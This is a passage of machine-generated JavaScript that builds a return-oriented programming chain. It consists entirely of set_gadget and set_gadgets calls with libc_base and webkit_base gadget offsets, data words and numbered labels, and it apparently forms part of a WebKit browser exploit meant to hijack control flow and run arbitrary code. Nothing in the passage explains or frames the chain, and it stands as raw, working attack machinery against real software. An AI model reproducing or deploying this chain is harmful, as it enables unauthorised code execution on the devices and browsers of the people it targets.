libc_base+713278, //pop rsi
ropchain+112984, //L1222
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1222:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+113096, //L1226
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1224:
db([2, 0]); // 0x2
set_gadget(libc_base+772328,); //pop rcx
//L1225:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1226:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+113176, //L1227
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+113192, //L1228
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1227:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1228:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+113280, //L1229
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1229:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+113336, //L1231
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1231:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+113456, //L1234
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1233:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1234:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+113560, //L1237
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+113544, //L1236
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1236:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1237:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+113704, //L1241
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+113672, //L1239
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+113688, //L1240
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1239:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1240:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1241:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+113776, //L1242
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1242:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+113832, //L1244
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1244:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+113944, //L1248
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1246:
db([25, 0]); // 0x19
set_gadget(libc_base+772328,); //pop rcx
//L1247:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1248:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+114024, //L1249
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+114040, //L1250
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1249:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1250:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+114128, //L1251
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1251:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+114184, //L1253
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1253:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+114256, //L1255
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1255:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+114312, //L1257
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1257:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1259:
libc_base+765023, //mov [rdi], r8
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+114464, //L1261
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1260:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1261:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+114568, //L1264
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+114552, //L1263
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1263:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+114712, //L1268
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+114680, //L1266
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+114696, //L1267
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1266:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1267:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1268:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+114784, //L1269
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1269:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+114840, //L1271
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1271:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+114952, //L1275
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1273:
db([26, 0]); // 0x1a
set_gadget(libc_base+772328,); //pop rcx
//L1274:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1275:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+115032, //L1276
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+115048, //L1277
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1276:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+115136, //L1278
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1278:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+115192, //L1280
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1280:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+115264, //L1282
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1282:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+115320, //L1284
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1284:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1286:
libc_base+165442, //pop rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+115472, //L1288
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1287:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1288:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+115576, //L1291
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+115560, //L1290
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1290:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1291:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+115720, //L1295
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+115688, //L1293
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+115704, //L1294
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1293:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1294:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1295:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+115792, //L1296
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1296:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+115848, //L1298
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1298:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+115960, //L1302
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1300:
db([27, 0]); // 0x1b
set_gadget(libc_base+772328,); //pop rcx
//L1301:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1302:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+116040, //L1303
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+116056, //L1304
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1303:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1304:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+116144, //L1305
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1305:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+116200, //L1307
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1307:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+116272, //L1309
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1309:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+116328, //L1311
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1311:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+116432, //L1314
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1313:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L1314:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+116536, //L1317
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+116520, //L1316
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1316:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1317:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+116680, //L1321
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+116648, //L1319
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+116664, //L1320
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1319:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1320:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1321:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+116752, //L1322
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1322:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+116808, //L1324
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1324:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+116920, //L1328
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1326:
db([1, 0]); // 0x1
set_gadget(libc_base+772328,); //pop rcx
//L1327:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1328:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+117000, //L1329
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+117016, //L1330
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1329:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1330:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+117104, //L1331
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1331:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+117160, //L1333
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1333:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+117280, //L1336
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1335:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1336:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+117384, //L1339
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+117368, //L1338
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1338:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1339:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+117528, //L1343
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+117496, //L1341
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+117512, //L1342
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1341:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1342:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1343:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+117600, //L1344
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1344:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+117656, //L1346
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1346:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+117768, //L1350
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1348:
db([28, 0]); // 0x1c
set_gadget(libc_base+772328,); //pop rcx
//L1349:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1350:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+117848, //L1351
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+117864, //L1352
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1351:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1352:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+117952, //L1353
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1353:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+118008, //L1355
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1355:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+118080, //L1357
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1357:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+118136, //L1359
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1359:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1361:
webkit_base+2847363, //mov [rdi], r9
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+118288, //L1363
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1362:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1363:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+118392, //L1366
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+118376, //L1365
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1365:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1366:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+118536, //L1370
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+118504, //L1368
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+118520, //L1369
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1368:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1369:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1370:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+118608, //L1371
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1371:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+118664, //L1373
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1373:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+118776, //L1377
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1375:
db([29, 0]); // 0x1d
set_gadget(libc_base+772328,); //pop rcx
//L1376:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1377:
db([0, 0]); // 0x0
